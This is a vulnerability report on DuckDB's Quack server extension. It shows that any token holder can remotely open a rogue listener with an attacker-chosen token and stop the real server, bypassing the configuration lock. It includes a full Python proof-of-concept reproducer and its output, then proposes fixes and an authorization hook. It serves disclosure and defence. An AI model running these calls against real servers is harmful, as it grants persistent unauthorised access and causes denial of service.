# Quack: any token holder can start and stop listeners on the server host, despite `lock_configuration` and `enable_external_access=false`

## Summary

A client with a valid token can run `quack_serve(...)` through a remote Quack connection and open a second listener on the server host, on all interfaces, with a token the client picks. It can also run `quack_stop(...)` and stop the real server. Neither `enable_external_access=false` nor `lock_configuration=true` prevents this. **verified**, DuckDB 2.0.0.

## Context

Manta plans to let the browser's DuckDB-Wasm attach a read-only, token-gated server instance. The token is meant to be the only way in, and the config lock is meant to freeze what a client can change. This breaks both:

- **A listener the attacker owns.** The new listener carries an attacker-chosen token, so access survives revocation of the original token. It can bind `0.0.0.0` even when the real server is loopback-only behind a TLS proxy, which bypasses the proxy. Queries on it run in the server process, with its secrets and files. **verified** (reproducer, step 2, over a LAN address).
- **Denial of service.** `quack_stop('quack:localhost:<port>')` stops the real server. The rogue listener keeps running. **verified**
- **No setting stops it.** `quack_serve` is an ordinary table function, so only an authorization hook can block it.

What the docs say:

- [security](https://duckdb.org/docs/2.0/quack/security.html): "A Quack server exposes the full SQL surface of the underlying DuckDB instance"; authorization is "permissive" by default; the read-only macro there is "illustrative, not a robust read-only filter". It says nothing about remote clients calling `quack_serve` or `quack_stop`, and does not mention `lock_configuration` or `enable_external_access`. **read**
- [reference](https://duckdb.org/docs/2.0/quack/reference.html): documents `quack_serve` ("Localhost-only by default", `allow_other_hostname` for other binds) and `quack_stop`. It says nothing about who may call them, and lists no setting that restricts functions for remote sessions. **read**
- [extension page](https://duckdb.org/docs/2.0/core_extensions/quack): no mention. **read**

The documented "localhost-only by default" therefore only constrains the operator, not a client.

## Minimal reproducer

`/tmp/quack-issue-1/repro.py`, shown in full below. It starts the server as a subprocess on 9901 (token, then `enable_external_access=false` and `lock_configuration=true`), attaches a client, and runs the attack. Run with `datarecord/.venv/bin/python -I repro.py`.

```python
# Run: datarecord/.venv/bin/python -I repro.py   (DuckDB 2.0.0, ports 9901/9902)
import socket, subprocess, sys, time
import duckdb

REAL, ROGUE = 9901, 9902
SERVER = f"""
import time, duckdb
c = duckdb.connect(":memory:")
c.execute("INSTALL quack; LOAD quack;")
c.execute("CALL quack_serve('quack:localhost:{REAL}', token='real-token')")
c.execute("SET enable_external_access=false")
c.execute("SET lock_configuration=true")
print("server ready", flush=True); time.sleep(60)
"""
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("10.255.255.255", 1))
IP = s.getsockname()[0]; s.close()  # LAN address, no packet sent

def up(host, port):
    try: socket.create_connection((host, port), timeout=1).close(); return True
    except OSError: return False

def remote(cli, name, sql):
    return cli.execute(f"FROM {name}.query($${sql}$$)").fetchall()

srv = subprocess.Popen([sys.executable, "-I", "-c", SERVER], stdout=subprocess.PIPE, text=True)
try:
    srv.stdout.readline()
    cli = duckdb.connect(":memory:"); cli.execute("LOAD quack")
    cli.execute(f"ATTACH 'quack:localhost:{REAL}' AS r (TOKEN 'real-token')")
    print("server (ext_access, locked):", remote(cli, "r",
        "SELECT current_setting('enable_external_access'), current_setting('lock_configuration')"))
    print(f"[1] listener on {IP}:{ROGUE} before: expected False, actual {up(IP, ROGUE)}")
    try:  # expected: denied
        print("quack_serve via remote:", remote(cli, "r", f"SELECT * FROM quack_serve('quack:0.0.0.0:{ROGUE}', "
              "allow_other_hostname=true, disable_ssl=true, token='attacker-chosen-token')"))
    except Exception as e: print("quack_serve denied (expected):", str(e)[:100])
    print(f"[1] listener on {IP}:{ROGUE} after: expected False, actual {up(IP, ROGUE)}")
    try:  # expected: no listener, so this fails
        cli.execute(f"ATTACH 'quack:{IP}:{ROGUE}' AS rogue (TOKEN 'attacker-chosen-token', DISABLE_SSL true)")
        print("[2] attach rogue over LAN: expected failure, actual ok:", remote(cli, "rogue", "SELECT 42"))
    except Exception as e: print("[2] attach rogue failed (expected):", str(e)[:100])
    try:  # expected: denied
        print("quack_stop via remote:", remote(cli, "r", f"SELECT * FROM quack_stop('quack:localhost:{REAL}')"))
    except Exception as e: print("quack_stop denied (expected):", str(e)[:100])
    time.sleep(1)
    print(f"[3] real server up: expected True, actual {up('localhost', REAL)}; rogue up: {up(IP, ROGUE)}")
finally:
    srv.kill()
```

Actual output (run on this machine, copied from `/tmp/quack-issue-1/out.txt`):

```
server (ext_access, locked): [(False, True)]
[1] listener on 192.168.11.7:9902 before: expected False, actual False
quack_serve via remote: [('quack:0.0.0.0:9902', 'http://0.0.0.0:9902', 'attacker-chosen-token')]
[1] listener on 192.168.11.7:9902 after: expected False, actual True
[2] attach rogue over LAN: expected failure, actual ok: [(42,)]
quack_stop via remote: [('Stopped listening on quack:localhost:9901',)]
[3] real server up: expected True, actual False; rogue up: True
```

Expected: `quack_serve` and `quack_stop` denied, no new listener, real server still up. Actual: the listener appears, accepts the attacker token over `192.168.11.7`, and the real server is gone. The script exited cleanly and left no server processes.

## Environment

DuckDB 2.0.0 (`quack` via `INSTALL quack`), macOS 26.6.2 (Darwin 25.6.0), Python 3.14.5. Reproduced over a LAN address, not only loopback.

## Where it belongs

Both. Upstream is the cause: functions that open sockets or stop the server are reachable from a remote session, and the config lock does not cover them. Manta cannot fix that, and must not rely on the lock, so it needs its own authorization hook for any exposed deployment.

## Suggested fix

Upstream, recommended: a server-side setting (for example `quack_allow_remote_admin`, default false) that makes `quack_serve`, `quack_stop` and `quack_active_connections` fail when called through a Quack connection, while staying usable from the local process. Alternatives: have `lock_configuration` cover `quack_*`; or let a remote session stop only the listener it came in on. Whichever is chosen, document it on the security page.

Manta interim: an authorization hook that denies by default, with a function and statement allowlist built on the parsed AST (`json_serialize_sql`), as in the Requirements in `quack.md`. The hook receives the inner SQL of `query($$...$$)`, not just the wrapper. **verified**

Minimal hook tested (`/tmp/quack-issue-1/hook.py`, set with `SET GLOBAL quack_authorization_function` before the lock): `CREATE MACRO deny_all(sid, q) AS NOT regexp_matches(lower(q), 'quack_')`. Result: `SELECT 42` ran; `quack_serve`, `quack_stop`, `QUACK_STOP` and `quack_active_connections` all returned "Authorization failed". **verified**. This is a text denylist, not a boundary. It only shows the hook sees and can block these calls. It let `CREATE TABLE` through, and I did not try to bypass it. The AST allowlist is **untested**. A SELECT-only macro that returns NULL on non-SELECT broke `ATTACH` itself ("Authorization failed"), so the allowlist has to pass the statements `ATTACH` sends. **verified**

## Open questions

- Is this intended, with the hook as the sole gate? The security page implies so but never says it.
- Which `quack_*` functions would an upstream fix need to cover? `quack_active_connections` exposes other clients' queries (**verified** in `quack.md`).
- Does a remote `quack_serve` still fail under the lock when TLS is on? In `quack.md` it did (**verified** there); not re-tested here.
